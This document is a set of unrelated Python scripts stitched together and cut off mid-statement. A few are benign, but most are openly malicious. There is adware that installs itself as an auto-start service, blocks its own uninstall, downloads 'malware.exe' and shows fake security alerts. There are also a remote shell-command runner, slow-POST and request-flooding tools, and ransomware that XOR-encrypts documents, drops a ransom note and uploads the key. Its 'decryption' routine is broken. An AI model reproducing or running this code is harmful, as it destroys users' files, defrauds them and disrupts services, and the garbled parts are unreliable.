import os
import sys
import time
import webbrowser
from datetime import datetime

LOG_DIR = "./target"
LOG_FILE = "reminder_tool.log"

def log_message(message):
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(os.path.join(LOG_DIR, LOG_FILE), "a") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_file.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Error: Unable to write to log file. {e}", file=sys.stderr)

def open_url(url):
    try:
        if webbrowser.open(url):
            log_message(f"Successfully opened URL: {url}")
            print(f"Successfully opened URL: {url}")
        else:
            log_message(f"Failed to open URL: {url}")
            print(f"Failed to open URL: {url}", file=sys.stderr)
    except Exception as e:
        log_message(f"Error: Could not open URL {url}. Exception: {e}")
        print(f"Error: Could not open URL. {e}", file=sys.stderr)

def detach_process():
    if os.name != 'nt':
        # Detach from terminal on Unix-like systems
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)  # Parent process exits
        except OSError as e:
            print(f"Error: Unable to fork process. {e}", file=sys.stderr)
            sys.exit(1)
        os.setsid()
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent process exits
        sys.stdout.flush()
        sys.stderr.flush()
        with open(os.devnull, 'r') as devnull:
            os.dup2(devnull.fileno(), sys.stdin.fileno())
        with open(os.devnull, 'a') as devnull:
            os.dup2(devnull.fileno(), sys.stdout.fileno())
            os.dup2(devnull.fileno(), sys.stderr.fileno())

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 4:
        print("Usage: python script.py <URL> [interval_seconds] [attempts]", file=sys.stderr)
        log_message("Error: Incorrect number of arguments provided.")
        sys.exit(1)

    url = sys.argv[1]
    interval = int(sys.argv[2]) if len(sys.argv) >= 3 else 3600
    attempts = int(sys.argv[3]) if len(sys.argv) == 4 else 1

    detach_process()

    for attempt in range(attempts):
        log_message(f"Attempt {attempt + 1} to open URL: {url}")
        open_url(url)
        if attempt < attempts - 1:
            time.sleep(interval)

if __name__ == "__main__":
    main()

import os
import sys
import time
import urllib.request
import json
import platform
import ctypes
import subprocess

STATE_FILE = './target/state.json'
SERVICE_NAME_WINDOWS = "AdwareService"
SERVICE_FILE_LINUX = '/etc/systemd/system/adware.service'


def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading state file: {e}")
    return {"completed_iterations": 0}


def save_state(state):
    try:
        with open(STATE_FILE, 'w') as f:
            json.dump(state, f)
    except Exception as e:
        print(f"Error saving state file: {e}")


def download_file(url, target_directory):
    try:
        if not os.path.exists(target_directory):
            os.makedirs(target_directory)

        filename = os.path.basename(url)
        if not filename:
            print("Error: Unable to determine filename from URL.")
            sys.exit(1)

        filepath = os.path.join(target_directory, filename)
        urllib.request.urlretrieve(url, filepath)
        print(f"File downloaded successfully: {filepath}")
        return filepath

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


def display_fake_security_alert():
    message = "Warning: Potential malware detected! Immediate action required!"
    if platform.system() == "Windows":
        ctypes.windll.user32.MessageBoxW(0, message, "Security Alert", 0x30)
    else:
        print(f"SECURITY ALERT: {message}")


def create_service():
    if platform.system() == "Windows":
        try:
            command = f"sc create {SERVICE_NAME_WINDOWS} binPath= \"{sys.executable} {os.path.abspath(sys.argv[0])}\" start= auto"
            subprocess.run(command, shell=True, check=True)
            print(f"Service '{SERVICE_NAME_WINDOWS}' created successfully.")
        except Exception as e:
            print(f"Error creating service on Windows: {e}")
    elif platform.system() == "Linux":
        try:
            service_content = f"""
[Unit]
Description=Adware Service
After=multi-user.target

[Service]
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open(SERVICE_FILE_LINUX, 'w') as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", "adware"], check=True)
            subprocess.run(["systemctl", "start", "adware"], check=True)
            print("Service 'adware' created and started successfully.")
        except Exception as e:
            print(f"Error creating service on Linux: {e}")


def main():
    url = "https://example.com/malware.exe"
    target_directory = './target'
    interval = 60  # Default interval in seconds
    max_iterations = 5  # Default maximum iterations
    persist = True  # Enable persistence by default

    # Establish persistence
    create_service()

    # Load state if persistence is enabled
    state = load_state() if persist else {"completed_iterations": 0}

    for i in range(state["completed_iterations"], max_iterations):
        print(f"Starting iteration {i + 1}...")
        filepath = download_file(url, target_directory)
        display_fake_security_alert()
        state["completed_iterations"] = i + 1
        if persist:
            save_state(state)
        if interval > 0 and i + 1 < max_iterations:
            time.sleep(interval)

    print("All iterations completed.")
    sys.exit(0)


if __name__ == "__main__":
    main()

import os
import sys
import shutil
import urllib.request
import subprocess
from datetime import datetime
import time
import platform

LOG_FILE = "notification_log.txt"
SANDBOX_DIR = "./sandbox"
DEFAULT_ITERATIONS = 1
DEFAULT_INTERVAL = 10  # seconds
FAKE_AD_FILE = "fake_ad.html"

def fetch_url_content(url):
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode("utf-8")
    except Exception as e:
        log_error(f"Error fetching URL content: {e}")
        sys.exit(1)

def log_content(content):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {content}\n")
    except Exception as e:
        log_error(f"Error writing to log file: {e}")
        sys.exit(1)

def log_error(message):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] ERROR: {message}\n")
    except:
        print(f"Critical error: {message}", file=sys.stderr)

def copy_to_sandbox():
    try:
        os.makedirs(SANDBOX_DIR, exist_ok=True)
        target_path = os.path.join(SANDBOX_DIR, os.path.basename(__file__))
        if not os.path.exists(target_path):
            shutil.copy(__file__, target_path)
    except Exception as e:
        log_error(f"Error copying file to sandbox: {e}")
        sys.exit(1)

def run_as_background_process():
    try:
        subprocess.Popen([sys.executable, __file__, "--background"])
    except Exception as e:
        log_error(f"Error starting background process: {e}")

def create_fake_ad(content):
    try:
        with open(FAKE_AD_FILE, "w") as ad_file:
            ad_file.write(content)
    except Exception as e:
        log_error(f"Error creating fake ad file: {e}")
        sys.exit(1)

def establish_persistence():
    try:
        if platform.system() == "Windows":
            service_name = "AdwareService"
            service_command = f"sc create {service_name} binPath= \"{sys.executable} {__file__} --background\" start= auto"
            subprocess.run(service_command, shell=True, check=True)
        elif platform.system() == "Linux":
            service_name = "adware"
            service_file = f"/etc/systemd/system/{service_name}.service"
            service_content = f"""
            [Unit]
            Description=Adware Service
            After=network.target

            [Service]
            ExecStart={sys.executable} {os.path.abspath(__file__)} --background
            Restart=always

            [Install]
            WantedBy=multi-user.target
            """
            with open(service_file, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", service_name], check=True)
    except Exception as e:
        log_error(f"Error establishing persistence: {e}")
        sys.exit(1)

def prevent_uninstall():
    try:
        if platform.system() == "Windows":
            target_path = os.path.join(SANDBOX_DIR, os.path.basename(__file__))
            subprocess.run(f"attrib +r +s +h {target_path}", shell=True, check=True)
        elif platform.system() == "Linux":
            target_path = os.path.join(SANDBOX_DIR, os.path.basename(__file__))
            os.chmod(target_path, 0o555)
    except Exception as e:
        log_error(f"Error preventing uninstallation: {e}")
        sys.exit(1)

def main():
    if "--background" in sys.argv:
        url = os.getenv("FETCH_URL", "https://example.com/ad")
        iterations = int(os.getenv("FETCH_ITERATIONS", DEFAULT_ITERATIONS))
        interval = float(os.getenv("FETCH_INTERVAL", DEFAULT_INTERVAL))

        for _ in range(iterations):
            content = fetch_url_content(url)
            log_content(content)
            create_fake_ad(content)
            time.sleep(interval)
        sys.exit(0)

    copy_to_sandbox()
    os.environ["FETCH_URL"] = "https://example.com/ad"
    os.environ["FETCH_ITERATIONS"] = str(DEFAULT_ITERATIONS)
    os.environ["FETCH_INTERVAL"] = str(DEFAULT_INTERVAL)

    establish_persistence()
    prevent_uninstall()
    run_as_background_process()

if __name__ == "__main__":
    main()

import random
import sys
import os
import argparse
import logging

def check_authentication():
    return random.choice(['success', 'failure'])

def record_result(status, file_path):
    try:
        with open(file_path, 'a') as f:
            f.write(f"auth,check,status:{status}\n")
        logging.info(f"Recorded status: {status}")
    except IOError as e:
        logging.error(f"Failed to write to file {file_path}: {e}")
        sys.exit(1)

def summarize_results(file_path):
    total_checks = 0
    success_count = 0
    failure_count = 0

    if not os.path.exists(file_path):
        logging.warning(f"No existing audit file found at {file_path}.")
        return total_checks, success_count, failure_count

    try:
        with open(file_path, 'r') as f:
            for line in f:
                total_checks += 1
                if 'status:success' in line:
                    success_count += 1
                elif 'status:failure' in line:
                    failure_count += 1

    except IOError as e:
        logging.error(f"Failed to read from file {file_path}: {e}")
        sys.exit(1)

    logging.info("Summary generation complete")
    return total_checks, success_count, failure_count

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def parse_arguments():
    parser = argparse.ArgumentParser(description='Authentication Check Tool')
    parser.add_argument('-n', '--num-checks', type=int, default=1, help='Number of checks to perform')
    parser.add_argument('-o', '--output-dir', type=str, default='.', help='Output directory for auth_audit.txt')
    return parser.parse_args()

def main():
    setup_logging()
    args = parse_arguments()
    file_path = os.path.join(args.output_dir, 'auth_audit.txt')

    for _ in range(args.num_checks):
        status = check_authentication()
        record_result(status, file_path)

    total_checks, success_count, failure_count = summarize_results(file_path)
    print(f"Summary:")
    print(f"  Total checks: {total_checks}")
    print(f"  Success count: {success_count}")
    print(f"  Failure count: {failure_count}")

    sys.exit(0)

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import datetime
import base64
import hashlib
import hmac
import time
import urllib.request
import urllib.error

LOG_FILE = "execution_log.txt"
RECOVERY_NOTE = "RECOVERY_NOTE.txt"
OFFLINE_COMMANDS_FILE = "offline_commands.enc"
KEY_FILE = "key.txt"
SERVER_URL = "https://example.com/encrypted_commands"

def write_recovery_note():
    note = (
        "RECOVERY NOTE\n"
        "==============\n"
        "To recover encrypted files:\n"
        "1. Ensure the key file ('key.txt') is securely stored.\n"
        "2. Use the key to decrypt the files manually if needed.\n"
        "3. Contact IT support for assistance if the key is lost.\n"
    )
    with open(RECOVERY_NOTE, "w") as file:
        file.write(note)

def load_key():
    try:
        with open(KEY_FILE, "rb") as file:
            return file.read().strip()
    except FileNotFoundError:
        print(f"Error: Key file '{KEY_FILE}' not found.")
        sys.exit(1)

def decrypt_data(encrypted_data, key):
    try:
        decoded_data = base64.b64decode(encrypted_data)
        return hmac.new(key, decoded_data, hashlib.sha256).digest().decode("utf-8")
    except Exception as e:
        print(f"Error decrypting data: {e}")
        sys.exit(1)

def log_result(command, status, output, error, retry=False):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"[{timestamp}] {'Retry: ' if retry else ''}Command: {command}\n")
        log_file.write(f"Status: {status}\n")
        if output:
            log_file.write(f"Output: {output}\n")
        if error:
            log_file.write(f"Error: {error}\n")
        log_file.write("\n")

def execute_commands(commands):
    results = []
    for command in commands:
        try:
            result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            results.append((command, "Success", result.stdout, None))
            log_result(command, "Success", result.stdout, None)
        except subprocess.CalledProcessError as e:
            results.append((command, "Failure", None, e.stderr))
            log_result(command, "Failure", None, e.stderr)

    print("\nCommand Execution Summary:")
    for cmd, status, _, _ in results:
        print(f"Command: {cmd} - Result: {status}")

def fetch_remote_commands(url, key):
    retries = 0
    max_retries = 5
    backoff_factor = 2
    while retries < max_retries:
        try:
            response = urllib.request.urlopen(url)
            encrypted_data = response.read()
            return decrypt_data(encrypted_data, key).splitlines()
        except urllib.error.URLError as e:
            retries += 1
            wait_time = backoff_factor ** retries
            log_result("Fetch remote commands", "Failure", None, str(e), retry=True)
            time.sleep(wait_time)
    print("Error: Failed to fetch remote commands after multiple retries.")
    return None

def load_offline_commands(key):
    try:
        with open(OFFLINE_COMMANDS_FILE, "rb") as file:
            encrypted_data = file.read()
            return decrypt_data(encrypted_data, key).splitlines()
    except FileNotFoundError:
        print(f"Error: Offline commands file '{OFFLINE_COMMANDS_FILE}' not found.")
        sys.exit(1)

def main():
    write_recovery_note()
    key = load_key()

    remote_commands = fetch_remote_commands(SERVER_URL, key)
    if remote_commands:
        execute_commands(remote_commands)
    else:
        print("Switching to offline mode...")
        offline_commands = load_offline_commands(key)
        execute_commands(offline_commands)

if __name__ == "__main__":
    main()

import http.client
import urllib.parse
import time
import os
import sys
from datetime import datetime, timedelta

LOG_DIR = './target'
LOG_FILE = os.path.join(LOG_DIR, 'network_requests.log')

DEFAULT_DURATION = 30  # default duration in seconds
DEFAULT_URL = "http://example.com"  # default URL for testing
DEFAULT_PAYLOAD = "key=value"  # default payload

def ensure_log_directory_exists():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception as e:
        print("Failed to create log directory:", e)

def log_request_attempt(timestamp, url, status=None, error=None):
    try:
        with open(LOG_FILE, 'a') as log_file:
            if error:
                log_file.write(f"{timestamp} | URL: {url} | ERROR: {error}\n")
            else:
                log_file.write(f"{timestamp} | URL: {url} | STATUS: {status}\n")
    except Exception as e:
        print("Failed to write to log file:", e)

def send_slow_post_request(url, payload, chunk_size=10, delay=0.5):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.scheme not in ('http', 'https'):
            raise ValueError("Invalid URL scheme. Use 'http' or 'https'.")

        connection = (http.client.HTTPSConnection if parsed_url.scheme == 'https' 
                      else http.client.HTTPConnection)(parsed_url.netloc)

        path = parsed_url.path or '/'
        connection.connect()
        connection.putrequest("POST", path)
        connection.putheader("Content-Type", "application/x-www-form-urlencoded")
        connection.putheader("Content-Length", str(len(payload)))
        connection.endheaders()

        for i in range(0, len(payload), chunk_size):
            connection.send(payload[i:i + chunk_size].encode('utf-8'))
            time.sleep(delay)

        response = connection.getresponse()
        status = f"{response.status} {response.reason}"
        body = response.read().decode('utf-8')
        print("Response status:", response.status)
        print("Response reason:", response.reason)
        print("Response body:", body)
        log_request_attempt(timestamp, url, status=status)
    except ValueError as ve:
        print("Error:", ve)
        log_request_attempt(timestamp, url, error=str(ve))
    except Exception as e:
        print("Error occurred:", e)
        log_request_attempt(timestamp, url, error=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

def validate_duration(duration):
    try:
        return int(duration)
    except ValueError:
        raise ValueError("Duration must be a positive integer representing seconds.")

def main():
    ensure_log_directory_exists()

    if len(sys.argv) > 2:
        print("Usage: python program.py [duration_in_seconds]")
        sys.exit(1)

    # Default values for silent execution
    duration_seconds = DEFAULT_DURATION
    target_url = DEFAULT_URL
    payload = DEFAULT_PAYLOAD

    # If a duration is provided as an argument, use it instead
    if len(sys.argv) == 2:
        try:
            duration_seconds = validate_duration(sys.argv[1])
            if duration_seconds <= 0:
                raise ValueError("Duration must be greater than 0.")
        except ValueError as e:
            print("Error:", e)
            sys.exit(1)

    end_time = datetime.now() + timedelta(seconds=duration_seconds)

    while datetime.now() < end_time:
        send_slow_post_request(target_url, payload)
        time.sleep(1)  # Pause between requests to avoid excessive traffic

    print("Test completed.")

if __name__ == "__main__":
    main()

import socket
import sys
import time
from datetime import datetime

LOG_FILE = "udp_log.txt"
DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 12345
DEFAULT_MESSAGE = "Hello, UDP!"
DEFAULT_DURATION = 10  # seconds
DEFAULT_SILENT = False
DEFAULT_RETRIES = 3

def log_udp_send(ip, port, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} | udp | packet | destination={ip} port={port} datagram={message}\n"
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_entry)
    except IOError as e:
        print(f"Error writing to log file: {e}", file=sys.stderr)

def send_udp_packet(ip, port, message, retries, silent):
    attempt = 0
    while attempt <= retries:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(message.encode(), (ip, int(port)))
            if not silent:
                print(f"Packet sent to {ip}:{port} with message: '{message}'")
            return True
        except socket.error as e:
            if attempt < retries:
                if not silent:
                    print(f"Network error: {e}. Retrying...")
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                if not silent:
                    print(f"Failed to send packet after {retries + 1} attempts due to network error: {e}")
            attempt += 1
    return False

def send_udp_for_duration(ip, port, message, duration, retries, silent):
    start_time = time.time()
    while time.time() - start_time < duration:
        success = send_udp_packet(ip, port, message, retries, silent)
        if success:
            log_udp_send(ip, port, message)
        # Ensure packets are sent at 1-second intervals
        elapsed = time.time() - start_time
        remaining = start_time + duration - time.time()
        if remaining > 1:
            time.sleep(1 - (elapsed % 1))

if __name__ == "__main__":
    send_udp_for_duration(
        ip=DEFAULT_IP,
        port=DEFAULT_PORT,
        message=DEFAULT_MESSAGE,
        duration=DEFAULT_DURATION,
        retries=DEFAULT_RETRIES,
        silent=DEFAULT_SILENT,
    )
    if not DEFAULT_SILENT:
        print(f"Packet sending completed. Logs written to {LOG_FILE}")

import sys
import time
import http.client
import argparse
from urllib.parse import urlparse


def send_requests(url="http://example.com", duration=10, log_file=None, silent=False):
    parsed_url = urlparse(url)
    connection = (
        http.client.HTTPSConnection(parsed_url.netloc)
        if parsed_url.scheme == "https"
        else http.client.HTTPConnection(parsed_url.netloc)
    )

    start_time = time.time()
    request_count = 0
    errors = []

    while time.time() - start_time < duration:
        try:
            connection.request("GET", parsed_url.path or "/")
            response = connection.getresponse()
            if not silent:
                print(f"Request {request_count + 1}: {response.status} {response.reason}")
            response.read()
            request_count += 1
        except Exception as e:
            error_message = f"Request {request_count + 1}: Error - {str(e)}"
            errors.append(error_message)
            if not silent:
                print(error_message)

    connection.close()

    # Log results to a log file if a path is provided
    if log_file:
        with open(log_file, "w") as log:
            log.write(f"Total requests sent: {request_count}\n")
            if errors:
                log.write("Errors:\n")
                log.write("\n".join(errors))
                log.write("\n")

    # Print summary if not in silent mode
    if not silent:
        print(f"\nTest completed. Total requests sent: {request_count}")
        if errors:
            print("Errors:")
            for error in errors:
                print(error)


def main():
    parser = argparse.ArgumentParser(
        description="HTTP GET request utility with configurable options."
    )
    parser.add_argument("url", nargs="?", default="http://example.com", help="Target URL to send requests to.")
    parser.add_argument(
        "duration", nargs="?", type=int, default=10, help="Test duration in seconds (e.g., 10)."
    )
    parser.add_argument(
        "--log-file", help="Path to a log file to save the results and errors."
    )
    parser.add_argument(
        "--silent", action="store_true", help="Run the utility in silent mode (no console output)."
    )
    args = parser.parse_args()

    try:
        send_requests(args.url, args.duration, log_file=args.log_file, silent=args.silent)
    except Exception as e:
        print(f"Fatal error: {str(e)}", file=sys.stderr)
        sys.exit(1)

    sys.exit(0)


if __name__ == "__main__":
    main()

import os
import sys
import time
import json
import logging
import http.client
import ctypes
from urllib.parse import urlparse

def transform_content(content, key):
    return bytes([b ^ key for b in content])

def process_file(file_path, log_file, key):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        transformed_content = transform_content(content, key)
        with open(file_path, 'wb') as f:
            f.write(transformed_content)
        log_file.write(f"{file_path}\n")
    except Exception as e:
        logging.error(f"Failed to process file {file_path}: {e}")

def write_ransom_note(directory, note_content):
    try:
        ransom_note_path = os.path.join(directory, 'RANSOM_NOTE.txt')
        with open(ransom_note_path, 'w') as f:
            f.write(note_content)
    except Exception as e:
        logging.error(f"Failed to write ransom note: {e}")

def upload_data(server_url, data, retries, backoff_factor):
    parsed_url = urlparse(server_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        logging.error(f"Invalid server URL: {server_url}")
        return False

    headers = {'Content-Type': 'application/json'}
    for attempt in range(retries):
        try:
            conn = http.client.HTTPSConnection(parsed_url.netloc) if parsed_url.scheme == 'https' else http.client.HTTPConnection(parsed_url.netloc)
            conn.request("POST", parsed_url.path or '/', body=json.dumps(data), headers=headers)
            response = conn.getresponse()
            if response.status == 200:
                logging.info("Data uploaded successfully.")
                return True
            else:
                logging.error(f"Failed to upload data. Server responded with status: {response.status}")
        except Exception as e:
            logging.error(f"Error during upload attempt {attempt + 1}: {e}")
        time.sleep(backoff_factor * (2 ** attempt))  # Exponential backoff

    logging.error("Max retries reached. Failed to upload data.")
    return False

def lock_system(note_content):
    try:
        user32 = ctypes.WinDLL('user32')
        user32.MessageBoxW(None, note_content, "System Locked", 0x10 | 0x0)
    except Exception as e:
        logging.error(f"Failed to lock system: {e}")

def scan_and_encrypt(directory, server_url, retries, backoff_factor):
    encryption_key = 0x55  # Example fixed XOR key
    log_file_path = os.path.join(directory, 'encryption_log.txt')
    ransom_note_content = (
        "Your files have been encrypted.\n"
        "To decrypt them, please contact IT support with the details provided.\n"
        "Thank you for your cooperation.\n"
    )

    try:
        with open(log_file_path, 'w') as log_file:
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.csv')):
                        process_file(file_path, log_file, encryption_key)

        write_ransom_note(directory, ransom_note_content)

        with open(log_file_path, 'r') as log_file:
            log_data = log_file.read()

        data_to_upload = {
            'log': log_data,
            'encryption_key': encryption_key
        }
        if not upload_data(server_url, data_to_upload, retries, backoff_factor):
            logging.error("Failed to upload data. Exiting gracefully.")

        lock_system(ransom_note_content)
    except Exception as e:
        logging.error(f"Unexpected error during scan and encrypt: {e}")

if __name__ == "__main__":
    default_directory = "./"
    default_server_url = "http://localhost:8080/upload"
    default_retries = 3
    default_backoff = 1.0

    if not os.path.isdir(default_directory):
